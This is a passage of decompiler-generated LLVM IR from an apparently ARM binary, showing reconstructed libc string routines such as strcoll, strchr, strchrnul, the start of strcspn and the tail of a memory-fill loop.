  br i1 %v5_15c1c11, label %dec_label_pc_15c58, label %dec_label_pc_15c20.preheader

dec_label_pc_15c20.preheader:                     ; preds = %dec_label_pc_15c14
  %v1_15c2046 = inttoptr i32 %v0_15c2028 to i32*
  store i32 %v0_15c14, i32* %v1_15c2046, align 4
  %v3_15c2047 = add i32 %v0_15c2028, 4
  %v4_15c2048 = inttoptr i32 %v3_15c2047 to i32*
  %v5_15c2049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_15c2049, i32* %v4_15c2048, align 4
  %v6_15c2050 = add i32 %v0_15c2028, 8
  store i32 %v6_15c2050, i32* @r3, align 4
  %v0_15c2451 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c2452 = add i32 %v0_15c2451, -8
  store i32 %v1_15c2452, i32* %r2.global-to-local, align 4
  %v5_15c2c53 = icmp slt i32 %v1_15c2452, 8
  br i1 %v5_15c2c53, label %dec_label_pc_15c20.dec_label_pc_15c58.loopexit_crit_edge, label %dec_label_pc_15c30

dec_label_pc_15c30:                               ; preds = %dec_label_pc_15c20.preheader, %dec_label_pc_15c18.dec_label_pc_15c20_crit_edge
  %v6_15c2055 = phi i32 [ %v6_15c20, %dec_label_pc_15c18.dec_label_pc_15c20_crit_edge ], [ %v6_15c2050, %dec_label_pc_15c20.preheader ]
  %v0_15c2054 = phi i32 [ %v12_15c4c, %dec_label_pc_15c18.dec_label_pc_15c20_crit_edge ], [ %v0_15c2028, %dec_label_pc_15c20.preheader ]
  %v1_15c30 = inttoptr i32 %v6_15c2055 to i32*
  %v2_15c30 = load i32, i32* @r1, align 4
  store i32 %v2_15c30, i32* %v1_15c30, align 4
  %v3_15c30 = add i32 %v0_15c2054, 12
  %v4_15c30 = inttoptr i32 %v3_15c30 to i32*
  %v5_15c30 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_15c30, i32* %v4_15c30, align 4
  %v6_15c30 = add i32 %v0_15c2054, 16
  store i32 %v6_15c30, i32* @r3, align 4
  %v0_15c34 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c34 = add i32 %v0_15c34, -8
  store i32 %v1_15c34, i32* %r2.global-to-local, align 4
  %v5_15c3c = icmp slt i32 %v1_15c34, 8
  br i1 %v5_15c3c, label %dec_label_pc_15c30.dec_label_pc_15c58.loopexit_crit_edge, label %dec_label_pc_15c40

dec_label_pc_15c40:                               ; preds = %dec_label_pc_15c30
  %v1_15c40 = inttoptr i32 %v6_15c30 to i32*
  %v2_15c40 = load i32, i32* @r1, align 4
  store i32 %v2_15c40, i32* %v1_15c40, align 4
  %v3_15c40 = add i32 %v0_15c2054, 20
  %v4_15c40 = inttoptr i32 %v3_15c40 to i32*
  %v5_15c40 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_15c40, i32* %v4_15c40, align 4
  %v6_15c40 = add i32 %v0_15c2054, 24
  store i32 %v6_15c40, i32* @r3, align 4
  %v0_15c44 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c44 = add i32 %v0_15c44, -8
  store i32 %v1_15c44, i32* %r2.global-to-local, align 4
  %v5_15c4c = icmp slt i32 %v1_15c44, 8
  br i1 %v5_15c4c, label %dec_label_pc_15c40.dec_label_pc_15c58.loopexit_crit_edge, label %dec_label_pc_15c18

dec_label_pc_15c18:                               ; preds = %dec_label_pc_15c40
  %v7_15c4c = inttoptr i32 %v6_15c40 to i32*
  %v8_15c4c = load i32, i32* @r1, align 4
  store i32 %v8_15c4c, i32* %v7_15c4c, align 4
  %v9_15c4c = add i32 %v0_15c2054, 28
  %v10_15c4c = inttoptr i32 %v9_15c4c to i32*
  %v11_15c4c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_15c4c, i32* %v10_15c4c, align 4
  %v12_15c4c = add i32 %v0_15c2054, 32
  store i32 %v12_15c4c, i32* @r3, align 4
  %v6_15c50 = load i32, i32* %r2.global-to-local, align 4
  %v7_15c50 = add i32 %v6_15c50, -8
  store i32 %v7_15c50, i32* %r2.global-to-local, align 4
  %v5_15c1c = icmp slt i32 %v7_15c50, 8
  br i1 %v5_15c1c, label %dec_label_pc_15c18.dec_label_pc_15c58.loopexit_crit_edge, label %dec_label_pc_15c18.dec_label_pc_15c20_crit_edge

dec_label_pc_15c18.dec_label_pc_15c20_crit_edge:  ; preds = %dec_label_pc_15c18
  %v2_15c20.pre = load i32, i32* @r1, align 4
  %v1_15c20 = inttoptr i32 %v12_15c4c to i32*
  store i32 %v2_15c20.pre, i32* %v1_15c20, align 4
  %v3_15c20 = add i32 %v0_15c2054, 36
  %v4_15c20 = inttoptr i32 %v3_15c20 to i32*
  %v5_15c20 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_15c20, i32* %v4_15c20, align 4
  %v6_15c20 = add i32 %v0_15c2054, 40
  store i32 %v6_15c20, i32* @r3, align 4
  %v0_15c24 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c24 = add i32 %v0_15c24, -8
  store i32 %v1_15c24, i32* %r2.global-to-local, align 4
  %v5_15c2c = icmp slt i32 %v1_15c24, 8
  br i1 %v5_15c2c, label %dec_label_pc_15c20.dec_label_pc_15c58.loopexit_crit_edge, label %dec_label_pc_15c30

dec_label_pc_15c18.dec_label_pc_15c58.loopexit_crit_edge: ; preds = %dec_label_pc_15c18
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c58

dec_label_pc_15c20.dec_label_pc_15c58.loopexit_crit_edge: ; preds = %dec_label_pc_15c18.dec_label_pc_15c20_crit_edge, %dec_label_pc_15c20.preheader
  %v1_15c24.lcssa = phi i32 [ %v1_15c2452, %dec_label_pc_15c20.preheader ], [ %v1_15c24, %dec_label_pc_15c18.dec_label_pc_15c20_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c58

dec_label_pc_15c30.dec_label_pc_15c58.loopexit_crit_edge: ; preds = %dec_label_pc_15c30
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c58

dec_label_pc_15c40.dec_label_pc_15c58.loopexit_crit_edge: ; preds = %dec_label_pc_15c40
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c58

dec_label_pc_15c58:                               ; preds = %dec_label_pc_15c14, %dec_label_pc_15c18.dec_label_pc_15c58.loopexit_crit_edge, %dec_label_pc_15c20.dec_label_pc_15c58.loopexit_crit_edge, %dec_label_pc_15c30.dec_label_pc_15c58.loopexit_crit_edge, %dec_label_pc_15c40.dec_label_pc_15c58.loopexit_crit_edge, %entry
  %v0_15c60 = phi i32 [ %arg3, %entry ], [ %v1_15c44, %dec_label_pc_15c40.dec_label_pc_15c58.loopexit_crit_edge ], [ %v1_15c34, %dec_label_pc_15c30.dec_label_pc_15c58.loopexit_crit_edge ], [ %v1_15c24.lcssa, %dec_label_pc_15c20.dec_label_pc_15c58.loopexit_crit_edge ], [ %v7_15c50, %dec_label_pc_15c18.dec_label_pc_15c58.loopexit_crit_edge ], [ %v0_15c18.pr, %dec_label_pc_15c14 ]
  %v2_15c58 = icmp eq i32 %v0_15c60, 0
  store i1 %v2_15c58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c58, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_15c58
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_15c58
  %v1_15c60 = sub i32 7, %v0_15c60
  store i32 %v1_15c60, i32* %r2.global-to-local, align 4
  %v3_15c64 = mul i32 %v1_15c60, 4
  %v4_15c64 = add i32 %v3_15c64, ptrtoint (i32* @global_var_15c6c.890 to i32)
  call void @__pseudo_branch(i32 %v4_15c64)
  %v0_15c6c = load i32, i32* @r1, align 4
  %v1_15c6c = trunc i32 %v0_15c6c to i8
  %v2_15c6c = load i32, i32* @r3, align 4
  %v3_15c6c = inttoptr i32 %v2_15c6c to i8*
  store i8 %v1_15c6c, i8* %v3_15c6c, align 1
  %v4_15c6c = load i32, i32* @r3, align 4
  %v5_15c6c = add i32 %v4_15c6c, 1
  store i32 %v5_15c6c, i32* %r3.global-to-local, align 4
  %v0_15c70 = load i32, i32* @r1, align 4
  %v1_15c70 = trunc i32 %v0_15c70 to i8
  %v3_15c70 = inttoptr i32 %v5_15c6c to i8*
  store i8 %v1_15c70, i8* %v3_15c70, align 1
  %v4_15c70 = load i32, i32* %r3.global-to-local, align 4
  %v5_15c70 = add i32 %v4_15c70, 1
  store i32 %v5_15c70, i32* %r3.global-to-local, align 4
  %v0_15c74 = load i32, i32* @r1, align 4
  %v1_15c74 = trunc i32 %v0_15c74 to i8
  %v3_15c74 = inttoptr i32 %v5_15c70 to i8*
  store i8 %v1_15c74, i8* %v3_15c74, align 1
  %v4_15c74 = load i32, i32* %r3.global-to-local, align 4
  %v5_15c74 = add i32 %v4_15c74, 1
  store i32 %v5_15c74, i32* %r3.global-to-local, align 4
  %v0_15c78 = load i32, i32* @r1, align 4
  %v1_15c78 = trunc i32 %v0_15c78 to i8
  %v3_15c78 = inttoptr i32 %v5_15c74 to i8*
  store i8 %v1_15c78, i8* %v3_15c78, align 1
  %v4_15c78 = load i32, i32* %r3.global-to-local, align 4
  %v5_15c78 = add i32 %v4_15c78, 1
  store i32 %v5_15c78, i32* %r3.global-to-local, align 4
  %v0_15c7c = load i32, i32* @r1, align 4
  %v1_15c7c = trunc i32 %v0_15c7c to i8
  %v3_15c7c = inttoptr i32 %v5_15c78 to i8*
  store i8 %v1_15c7c, i8* %v3_15c7c, align 1
  %v4_15c7c = load i32, i32* %r3.global-to-local, align 4
  %v5_15c7c = add i32 %v4_15c7c, 1
  store i32 %v5_15c7c, i32* %r3.global-to-local, align 4
  %v0_15c80 = load i32, i32* @r1, align 4
  %v1_15c80 = trunc i32 %v0_15c80 to i8
  %v3_15c80 = inttoptr i32 %v5_15c7c to i8*
  store i8 %v1_15c80, i8* %v3_15c80, align 1
  %v4_15c80 = load i32, i32* %r3.global-to-local, align 4
  %v5_15c80 = add i32 %v4_15c80, 1
  store i32 %v5_15c80, i32* %r3.global-to-local, align 4
  %v0_15c84 = load i32, i32* @r1, align 4
  %v1_15c84 = trunc i32 %v0_15c84 to i8
  %v3_15c84 = inttoptr i32 %v5_15c80 to i8*
  store i8 %v1_15c84, i8* %v3_15c84, align 1
  %v4_15c84 = load i32, i32* %r3.global-to-local, align 4
  %v5_15c84 = add i32 %v4_15c84, 1
  store i32 %v5_15c84, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_15c20, { 1, 0 }
  uselistorder i32 %v12_15c4c, { 1, 2, 0 }
  uselistorder i32 %v0_15c2054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_15c18.pr, { 0, 2, 1 }
  uselistorder i32 %v6_15c08, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_15bfc, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 12, 13, 11, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 5, 2, 1, 0, 3, 9, 7, 6, 4, 8 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15c58, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_15c30, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_15c94.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_15c94 = phi i32 [ %v0_15c94.pre, %bb ], [ %v5_15c94, %bb3 ]
  %v0_15c90 = phi i32 [ %tmp, %bb ], [ %v5_15c90, %bb3 ]
  %v1_15c90 = inttoptr i32 %v0_15c90 to i8*
  %v2_15c90 = load i8, i8* %v1_15c90, align 1
  %v1_15c94 = inttoptr i32 %v0_15c94 to i8*
  %v2_15c94 = load i8, i8* %v1_15c94, align 1
  %v3_15c94 = zext i8 %v2_15c94 to i32
  %v2_15c98 = icmp eq i8 %v2_15c90, 0
  br i1 %v2_15c98, label %.dec_label_pc_15ca4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_15c94 = add i32 %v0_15c94, 1
  %v5_15c90 = add i32 %v0_15c90, 1
  %v3_15c90 = zext i8 %v2_15c90 to i32
  %v10_15c9c = icmp eq i8 %v2_15c90, %v2_15c94
  br i1 %v10_15c9c, label %entry, label %dec_label_pc_15ca4

.dec_label_pc_15ca4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_15ca4

dec_label_pc_15ca4:                               ; preds = %bb3, %.dec_label_pc_15ca4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_15ca4_crit_edge ], [ %v3_15c90, %bb3 ]
  %v2_15ca4.pre-phi = sub nsw i32 %.pn, %v3_15c94
  ret i32 %v2_15ca4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_15c90, { 0, 2, 1 }
  uselistorder i32 %v0_15c90, { 1, 0 }
  uselistorder i32 %v0_15c94, { 1, 0 }
  uselistorder label %dec_label_pc_15ca4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_15d14 = urem i32 %arg1, 256
  %v0_15d343 = load i32, i32* @r0, align 4
  %v1_15d344 = urem i32 %v0_15d343, 4
  %v2_15d345 = icmp eq i32 %v1_15d344, 0
  br i1 %v2_15d345, label %dec_label_pc_15d3c, label %dec_label_pc_15d1c

dec_label_pc_15d1c:                               ; preds = %entry, %dec_label_pc_15d30
  %v0_15d30 = phi i32 [ %v1_15d30, %dec_label_pc_15d30 ], [ %v0_15d343, %entry ]
  %v1_15d1c = inttoptr i32 %v0_15d30 to i8*
  %v2_15d1c = load i8, i8* %v1_15d1c, align 1
  %v3_15d1c = zext i8 %v2_15d1c to i32
  %v9_15d20 = icmp eq i32 %v3_15d1c, %v1_15d14
  br i1 %v9_15d20, label %dec_label_pc_15df0, label %dec_label_pc_15d28

dec_label_pc_15d28:                               ; preds = %dec_label_pc_15d1c
  %v2_15d28 = icmp eq i8 %v2_15d1c, 0
  br i1 %v2_15d28, label %dec_label_pc_15dec, label %dec_label_pc_15d30

dec_label_pc_15d30:                               ; preds = %dec_label_pc_15d28
  %v1_15d30 = add i32 %v0_15d30, 1
  %v1_15d34 = urem i32 %v1_15d30, 4
  %v2_15d34 = icmp eq i32 %v1_15d34, 0
  br i1 %v2_15d34, label %dec_label_pc_15d3c, label %dec_label_pc_15d1c

dec_label_pc_15d3c:                               ; preds = %dec_label_pc_15d30, %entry
  %v0_15d40 = phi i32 [ %v0_15d343, %entry ], [ %v1_15d30, %dec_label_pc_15d30 ]
  %v4_15d3c = mul nuw nsw i32 %v1_15d14, 256
  %v5_15d3c = or i32 %v4_15d3c, %v1_15d14
  %v4_15d44 = mul i32 %v5_15d3c, 65536
  %v5_15d44 = or i32 %v4_15d44, %v5_15d3c
  br label %dec_label_pc_15d48

dec_label_pc_15d48:                               ; preds = %dec_label_pc_15de4, %dec_label_pc_15d84, %dec_label_pc_15d3c
  %v0_15dac = phi i32 [ %v0_15d40, %dec_label_pc_15d3c ], [ %v4_15d48, %dec_label_pc_15d84 ], [ %v4_15d48, %dec_label_pc_15de4 ]
  %v1_15d48 = inttoptr i32 %v0_15dac to i32*
  %v2_15d48 = load i32, i32* %v1_15d48, align 4
  %v4_15d48 = add i32 %v0_15dac, 4
  %v2_15d50 = xor i32 %v2_15d48, %v5_15d44
  %v2_15d5c = add i32 %v2_15d48, 2130640639
  %v1_15d60 = sub i32 -1, %v2_15d48
  %v2_15d64 = xor i32 %v2_15d5c, %v1_15d60
  %v2_15d70 = and i32 %v2_15d64, -2130640640
  store i32 %v2_15d70, i32* @r1, align 4
  %v2_15d78 = icmp eq i32 %v2_15d70, 0
  br i1 %v2_15d78, label %dec_label_pc_15d84, label %dec_label_pc_15d8c

dec_label_pc_15d84:                               ; preds = %dec_label_pc_15d48
  %v2_15d54 = add i32 %v2_15d50, 2130640639
  %v1_15d6c = sub i32 -1, %v2_15d50
  %v2_15d74 = xor i32 %v2_15d54, %v1_15d6c
  %v2_15d7c = and i32 %v2_15d74, -2130640640
  %v2_15d84 = icmp eq i32 %v2_15d7c, 0
  br i1 %v2_15d84, label %dec_label_pc_15d48, label %dec_label_pc_15d8c

dec_label_pc_15d8c:                               ; preds = %dec_label_pc_15d48, %dec_label_pc_15d84
  %v2_15d8c = inttoptr i32 %v0_15dac to i8*
  %v3_15d8c = load i8, i8* %v2_15d8c, align 1
  %v4_15d8c = zext i8 %v3_15d8c to i32
  %v9_15d90 = icmp eq i32 %v4_15d8c, %v1_15d14
  br i1 %v9_15d90, label %dec_label_pc_15df0, label %dec_label_pc_15d9c

dec_label_pc_15d9c:                               ; preds = %dec_label_pc_15d8c
  %v2_15d9c = icmp eq i8 %v3_15d8c, 0
  br i1 %v2_15d9c, label %dec_label_pc_15dec, label %dec_label_pc_15da4

dec_label_pc_15da4:                               ; preds = %dec_label_pc_15d9c
  %v1_15da4 = add i32 %v0_15dac, 1
  %v2_15da4 = inttoptr i32 %v1_15da4 to i8*
  %v3_15da4 = load i8, i8* %v2_15da4, align 1
  %v4_15da4 = zext i8 %v3_15da4 to i32
  %v9_15da8 = icmp eq i32 %v4_15da4, %v1_15d14
  br i1 %v9_15da8, label %dec_label_pc_15df0, label %dec_label_pc_15db4

dec_label_pc_15db4:                               ; preds = %dec_label_pc_15da4
  %v2_15db4 = icmp eq i8 %v3_15da4, 0
  br i1 %v2_15db4, label %dec_label_pc_15dec, label %dec_label_pc_15dbc

dec_label_pc_15dbc:                               ; preds = %dec_label_pc_15db4
  %v1_15dbc = add i32 %v0_15dac, 2
  %v2_15dbc = inttoptr i32 %v1_15dbc to i8*
  %v3_15dbc = load i8, i8* %v2_15dbc, align 1
  %v4_15dbc = zext i8 %v3_15dbc to i32
  %v9_15dc0 = icmp eq i32 %v4_15dbc, %v1_15d14
  br i1 %v9_15dc0, label %dec_label_pc_15df0, label %dec_label_pc_15dcc

dec_label_pc_15dcc:                               ; preds = %dec_label_pc_15dbc
  %v2_15dcc = icmp eq i8 %v3_15dbc, 0
  br i1 %v2_15dcc, label %dec_label_pc_15dec, label %dec_label_pc_15dd4

dec_label_pc_15dd4:                               ; preds = %dec_label_pc_15dcc
  %v1_15dd4 = add i32 %v0_15dac, 3
  %v2_15dd4 = inttoptr i32 %v1_15dd4 to i8*
  %v3_15dd4 = load i8, i8* %v2_15dd4, align 1
  %v4_15dd4 = zext i8 %v3_15dd4 to i32
  %v9_15dd8 = icmp eq i32 %v4_15dd4, %v1_15d14
  br i1 %v9_15dd8, label %dec_label_pc_15df0, label %dec_label_pc_15de4

dec_label_pc_15de4:                               ; preds = %dec_label_pc_15dd4
  %v2_15de4 = icmp eq i8 %v3_15dd4, 0
  br i1 %v2_15de4, label %dec_label_pc_15dec, label %dec_label_pc_15d48

dec_label_pc_15dec:                               ; preds = %dec_label_pc_15d28, %dec_label_pc_15de4, %dec_label_pc_15dcc, %dec_label_pc_15db4, %dec_label_pc_15d9c
  br label %dec_label_pc_15df0

dec_label_pc_15df0:                               ; preds = %dec_label_pc_15d1c, %dec_label_pc_15dd4, %dec_label_pc_15dbc, %dec_label_pc_15da4, %dec_label_pc_15d8c, %dec_label_pc_15dec
  %v1_15df4 = phi i32 [ 0, %dec_label_pc_15dec ], [ %v1_15dd4, %dec_label_pc_15dd4 ], [ %v1_15dbc, %dec_label_pc_15dbc ], [ %v1_15da4, %dec_label_pc_15da4 ], [ %v0_15dac, %dec_label_pc_15d8c ], [ %v0_15d30, %dec_label_pc_15d1c ]
  ret i32 %v1_15df4

; uselistorder directives
  uselistorder i32 %v4_15d48, { 1, 0 }
  uselistorder i32 %v2_15d48, { 0, 2, 1 }
  uselistorder i32 %v0_15dac, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_15d3c, { 1, 0 }
  uselistorder i32 %v1_15d30, { 1, 0, 2 }
  uselistorder i32 %v0_15d343, { 2, 1, 0 }
  uselistorder i32 %v1_15d14, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_15df0, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15dec, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15d8c, { 1, 0 }
  uselistorder label %dec_label_pc_15d1c, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_15e04 = urem i32 %arg1, 256
  %v0_15e242 = load i32, i32* @r0, align 4
  %v1_15e243 = urem i32 %v0_15e242, 4
  %v2_15e244 = icmp eq i32 %v1_15e243, 0
  br i1 %v2_15e244, label %dec_label_pc_15e2c, label %dec_label_pc_15e0c

dec_label_pc_15e0c:                               ; preds = %entry, %dec_label_pc_15e20
  %v0_15e20 = phi i32 [ %v1_15e20, %dec_label_pc_15e20 ], [ %v0_15e242, %entry ]
  %v1_15e0c = inttoptr i32 %v0_15e20 to i8*
  %v2_15e0c = load i8, i8* %v1_15e0c, align 1
  %v3_15e0c = zext i8 %v2_15e0c to i32
  %v9_15e10 = icmp eq i32 %v3_15e0c, %v1_15e04
  br i1 %v9_15e10, label %dec_label_pc_15edc, label %dec_label_pc_15e18

dec_label_pc_15e18:                               ; preds = %dec_label_pc_15e0c
  %v2_15e18 = icmp eq i8 %v2_15e0c, 0
  br i1 %v2_15e18, label %dec_label_pc_15edc, label %dec_label_pc_15e20

dec_label_pc_15e20:                               ; preds = %dec_label_pc_15e18
  %v1_15e20 = add i32 %v0_15e20, 1
  %v1_15e24 = urem i32 %v1_15e20, 4
  %v2_15e24 = icmp eq i32 %v1_15e24, 0
  br i1 %v2_15e24, label %dec_label_pc_15e2c, label %dec_label_pc_15e0c

dec_label_pc_15e2c:                               ; preds = %dec_label_pc_15e20, %entry
  %v0_15e30 = phi i32 [ %v0_15e242, %entry ], [ %v1_15e20, %dec_label_pc_15e20 ]
  %v4_15e2c = mul nuw nsw i32 %v1_15e04, 256
  %v5_15e2c = or i32 %v4_15e2c, %v1_15e04
  %v4_15e34 = mul i32 %v5_15e2c, 65536
  %v5_15e34 = or i32 %v4_15e34, %v5_15e2c
  br label %dec_label_pc_15e38

dec_label_pc_15e38:                               ; preds = %dec_label_pc_15ed4, %dec_label_pc_15e74, %dec_label_pc_15e2c
  %v0_15e9c = phi i32 [ %v0_15e30, %dec_label_pc_15e2c ], [ %v4_15e38, %dec_label_pc_15e74 ], [ %v4_15e38, %dec_label_pc_15ed4 ]
  %v1_15e38 = inttoptr i32 %v0_15e9c to i32*
  %v2_15e38 = load i32, i32* %v1_15e38, align 4
  %v4_15e38 = add i32 %v0_15e9c, 4
  %v2_15e40 = xor i32 %v2_15e38, %v5_15e34
  %v2_15e4c = add i32 %v2_15e38, 2130640639
  %v1_15e50 = sub i32 -1, %v2_15e38
  %v2_15e54 = xor i32 %v2_15e4c, %v1_15e50
  %v2_15e60 = and i32 %v2_15e54, -2130640640
  store i32 %v2_15e60, i32* @r1, align 4
  %v2_15e68 = icmp eq i32 %v2_15e60, 0
  br i1 %v2_15e68, label %dec_label_pc_15e74, label %dec_label_pc_15e7c

dec_label_pc_15e74:                               ; preds = %dec_label_pc_15e38
  %v2_15e44 = add i32 %v2_15e40, 2130640639
  %v1_15e5c = sub i32 -1, %v2_15e40
  %v2_15e64 = xor i32 %v2_15e44, %v1_15e5c
  %v2_15e6c = and i32 %v2_15e64, -2130640640
  %v2_15e74 = icmp eq i32 %v2_15e6c, 0
  br i1 %v2_15e74, label %dec_label_pc_15e38, label %dec_label_pc_15e7c

dec_label_pc_15e7c:                               ; preds = %dec_label_pc_15e38, %dec_label_pc_15e74
  %v2_15e7c = inttoptr i32 %v0_15e9c to i8*
  %v3_15e7c = load i8, i8* %v2_15e7c, align 1
  %v4_15e7c = zext i8 %v3_15e7c to i32
  %v9_15e80 = icmp eq i32 %v4_15e7c, %v1_15e04
  br i1 %v9_15e80, label %dec_label_pc_15edc, label %dec_label_pc_15e8c

dec_label_pc_15e8c:                               ; preds = %dec_label_pc_15e7c
  %v2_15e8c = icmp eq i8 %v3_15e7c, 0
  br i1 %v2_15e8c, label %dec_label_pc_15edc, label %dec_label_pc_15e94

dec_label_pc_15e94:                               ; preds = %dec_label_pc_15e8c
  %v1_15e94 = add i32 %v0_15e9c, 1
  %v2_15e94 = inttoptr i32 %v1_15e94 to i8*
  %v3_15e94 = load i8, i8* %v2_15e94, align 1
  %v4_15e94 = zext i8 %v3_15e94 to i32
  %v9_15e98 = icmp eq i32 %v4_15e94, %v1_15e04
  br i1 %v9_15e98, label %dec_label_pc_15edc, label %dec_label_pc_15ea4

dec_label_pc_15ea4:                               ; preds = %dec_label_pc_15e94
  %v2_15ea4 = icmp eq i8 %v3_15e94, 0
  br i1 %v2_15ea4, label %dec_label_pc_15edc, label %dec_label_pc_15eac

dec_label_pc_15eac:                               ; preds = %dec_label_pc_15ea4
  %v1_15eac = add i32 %v0_15e9c, 2
  %v2_15eac = inttoptr i32 %v1_15eac to i8*
  %v3_15eac = load i8, i8* %v2_15eac, align 1
  %v4_15eac = zext i8 %v3_15eac to i32
  %v9_15eb0 = icmp eq i32 %v4_15eac, %v1_15e04
  br i1 %v9_15eb0, label %dec_label_pc_15edc, label %dec_label_pc_15ebc

dec_label_pc_15ebc:                               ; preds = %dec_label_pc_15eac
  %v2_15ebc = icmp eq i8 %v3_15eac, 0
  br i1 %v2_15ebc, label %dec_label_pc_15edc, label %dec_label_pc_15ec4

dec_label_pc_15ec4:                               ; preds = %dec_label_pc_15ebc
  %v1_15ec4 = add i32 %v0_15e9c, 3
  %v2_15ec4 = inttoptr i32 %v1_15ec4 to i8*
  %v3_15ec4 = load i8, i8* %v2_15ec4, align 1
  %v4_15ec4 = zext i8 %v3_15ec4 to i32
  %v9_15ec8 = icmp eq i32 %v4_15ec4, %v1_15e04
  br i1 %v9_15ec8, label %dec_label_pc_15edc, label %dec_label_pc_15ed4

dec_label_pc_15ed4:                               ; preds = %dec_label_pc_15ec4
  %v2_15ed4 = icmp eq i8 %v3_15ec4, 0
  br i1 %v2_15ed4, label %dec_label_pc_15edc, label %dec_label_pc_15e38

dec_label_pc_15edc:                               ; preds = %dec_label_pc_15e18, %dec_label_pc_15e0c, %dec_label_pc_15ed4, %dec_label_pc_15ec4, %dec_label_pc_15ebc, %dec_label_pc_15eac, %dec_label_pc_15ea4, %dec_label_pc_15e94, %dec_label_pc_15e8c, %dec_label_pc_15e7c
  %v1_15ee0 = phi i32 [ %v1_15ec4, %dec_label_pc_15ed4 ], [ %v1_15ec4, %dec_label_pc_15ec4 ], [ %v1_15eac, %dec_label_pc_15ebc ], [ %v1_15eac, %dec_label_pc_15eac ], [ %v1_15e94, %dec_label_pc_15ea4 ], [ %v1_15e94, %dec_label_pc_15e94 ], [ %v0_15e9c, %dec_label_pc_15e8c ], [ %v0_15e9c, %dec_label_pc_15e7c ], [ %v0_15e20, %dec_label_pc_15e0c ], [ %v0_15e20, %dec_label_pc_15e18 ]
  ret i32 %v1_15ee0

; uselistorder directives
  uselistorder i32 %v4_15e38, { 1, 0 }
  uselistorder i32 %v2_15e38, { 0, 2, 1 }
  uselistorder i32 %v0_15e9c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_15e2c, { 1, 0 }
  uselistorder i32 %v1_15e20, { 1, 0, 2 }
  uselistorder i32 %v0_15e242, { 2, 1, 0 }
  uselistorder i32 %v1_15e04, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_15edc, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_15e7c, { 1, 0 }
  uselistorder label %dec_label_pc_15e0c, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_15eec = load i32, i32* @r4, align 4
  store i32 %v3_15eec, i32* %stack_var_-16, align 4
  %v6_15eec = load i32, i32* @r5, align 4
  %v9_15eec = load i32, i32* @r6, align 4
  %v0_15ef0 = load i32, i32* @r0, align 4
  %v0_15ef4 = load i32, i32* @r1, align 4
  store i32 %v0_15ef4, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_15f108 = inttoptr i32 %v0_15ef0 to i8*
  %v2_15f109 = load i8, i8* %v1_15f108, align 1
  %v3_15f1010 = zext i8 %v2_15f109 to i32
  store i32 %v3_15f1010, i32* @r1, align 4
  %v2_15f1411 = icmp eq i8 %v2_15f109, 0
  store i32 %v0_15ef4, i32* @r0, align 4
  %v1_15f1c12 = add i32 %v0_15ef0, 1
  store i32 %v1_15f1c12, i32* @r4, align 4
  br i1 %v2_15f1411, label %dec_label_pc_15f24, label %dec_label_pc_15f00

dec_label_pc_15f00:                               ; preds = %entry, %dec_label_pc_15f0c
  %v3_15f1014 = phi i32 [ %v3_15f10, %dec_label_pc_15f0c ], [ %v3_15f1010, %entry ]
  %v0_15f1813 = phi i32 [ %v0_15f18.pre, %dec_label_pc_15f0c ], [ %v0_15ef4, %entry ]
